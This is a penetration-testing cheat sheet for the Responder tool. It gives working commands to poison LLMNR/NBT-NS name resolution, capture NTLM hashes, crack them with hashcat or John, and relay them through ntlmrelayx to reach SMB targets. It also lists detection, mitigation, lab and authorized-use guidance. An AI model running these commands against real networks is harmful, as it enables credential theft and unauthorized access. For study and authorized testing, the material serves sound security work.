# **Responder Tool Cheat Sheet** 🛡️

## **🧰 WHAT IS RESPONDER?**

**Responder** is a network spoofing tool that targets:
- **LLMNR** (Link-Local Multicast Name Resolution)
- **NBT-NS** (NetBIOS Name Service) 
- **MDNS** (Multicast DNS)

**Capabilities:**
- Capture NTLMv1/v2 hashes for offline cracking
- Relay NTLM credentials (NTLM relay attacks)
- Dump SMB shares
- Execute commands via SMB relay

---

## **🔧 SETUP & INSTALLATION**

### Pre-installed on:
- Kali Linux
- Parrot OS

### Manual Installation:
```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
pip install -r requirements.txt
```

---

## **🚀 BASIC USAGE**

### Step 1: Identify Network Interface
```bash
ip a
```
*Find your interface (e.g., eth0, wlan0)*

### Step 2: Start Responder
```bash
sudo python3 Responder.py -I eth0
```

**Key Requirements:**
- Must be on same subnet as targets
- Layer 2 network access required

---

## **🎯 ATTACK SCENARIOS**

### A. Malicious UNC Path
```
\\FAKESHARE\docs
```
*User clicks → tries to resolve FAKESHARE → Responder captures credentials*

### B. Misconfigured Software
- Applications trying to resolve `HOSTNAME.local`
- Failed DNS lookups triggering fallback protocols

### C. Active Triggering
- Use `nbtscan`, `CrackMapExec`, or `msfconsole`
- Force broadcast name resolution requests

---

## **🔍 HASH ANALYSIS**

### Hash Storage Location:
```
Responder/logs/
```

### Cracking with Hashcat:
```bash
hashcat -m 5600 responder_hash.txt rockyou.txt
```
*-m 5600 = NTLMv2 mode*

### Alternative: John the Ripper
```bash
john --format=netntlmv2 responder_hash.txt
```

---

## **🔄 RELAY ATTACKS**

### Setup Relay Attack:

1. **Modify Responder.conf:**
```ini
SMB = Off
HTTP = Off
```

2. **Start ntlmrelayx:**
```bash
sudo ntlmrelayx.py -t smb://<target-ip> -smb2support
```

3. **Run Responder:**
```bash
sudo python3 Responder.py -I eth0
```

**Result:** Credentials relayed to target → potential shell/SAM dump

---

## **⚙️ ADVANCED OPTIONS**

| **Option** | **Description** |
|------------|----------------|
| `-w` | Enable WPAD rogue proxy server |
| `-F` | Fingerprint hostnames |
| `-A` | Analyze hostnames and determine best response |
| `-v` | Verbose mode |
| `-r` | Enable HTTP redirect |
| `-d` | Enable DHCP spoofing |

---

## **🛡️ DETECTION & MITIGATION**

### **Preventive Measures:**
- **Disable LLMNR/NBT-NS** via Group Policy
  - GPO → Network Settings → Turn Off Multicast Name Resolution
- **Enable SMB signing** (prevents relay attacks)
- **Strong password policies** (resist hash cracking)
- **Network segmentation** (limit broadcast domains)

### **Detection Methods:**
- **Wireshark** - Monitor LLMNR/NBT-NS traffic
- **IDS/IPS** - Detect unusual name resolution patterns
- **Defender for Identity** - Advanced threat detection
- **Zeek** - Network traffic analysis

### **Indicators:**
- Multiple failed DNS lookups followed by LLMNR/NBT-NS
- Unusual authentication attempts to non-existent shares
- High volume of broadcast name resolution requests

---

## **🧪 LAB SETUP**

### **Components:**
- **Attacker:** Kali Linux with Responder
- **Victim:** Windows 10/11 or Server
- **Network:** Same subnet/VLAN

### **Test Scenarios:**
1. Click malicious UNC paths (`\\FAKESHARE`)
2. Open crafted .LNK files
3. Misconfigured application scenarios
4. Manual hostname resolution attempts

---

## **📊 ATTACK FLOW**

```
1. DNS Lookup Fails
   ↓
2. System broadcasts LLMNR/NBT-NS query
   ↓
3. Responder intercepts & responds
   ↓
4. Victim sends credentials to attacker
   ↓
5. Hash capture/relay → Access gained
```

---

## **🔥 QUICK REFERENCE**

### **Essential Commands:**
```bash
# Basic capture
sudo python3 Responder.py -I eth0 -v

# With WPAD
sudo python3 Responder.py -I eth0 -w -v

# Analysis mode
sudo python3 Responder.py -I eth0 -A

# Relay setup
sudo ntlmrelayx.py -t <target> -smb2support
```

### **File Locations:**
- **Config:** `Responder.conf`
- **Logs:** `Responder/logs/`
- **Hashes:** `Responder/logs/*.txt`

---

## **⚠️ ETHICAL USAGE**

**Only use Responder in:**
- Authorized penetration tests
- Personal lab environments
- Educational/research contexts with proper permissions

**Never use for:**
- Unauthorized network access
- Malicious credential harvesting
- Corporate espionage